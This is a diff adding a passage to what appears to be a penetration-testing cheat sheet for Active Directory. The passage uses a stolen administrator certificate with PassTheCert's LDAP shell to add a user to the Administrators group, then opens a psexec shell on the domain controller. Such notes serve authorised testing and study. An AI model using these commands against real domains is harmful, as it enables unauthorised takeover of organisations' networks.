@@ -210,6 +210,20 @@ timedatectl set-ntp off
 sudo ntpdate $DC_IP
 ```
 
+```bash
+# If we have Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type), we can use passthecert 
+- [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/)
+administrator.pfx
+certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
+certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
+
+python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain $DOMAIN -dc-ip $DC_IP
+> add_user_to_group $USER Administrators
+
+impacket-psexec $USER@$DC_IP
+Password: 
+```
+
 - [TheHackerRecipes](https://www.thehacker.recipes/ad/movement/dacl/)
 
 ---
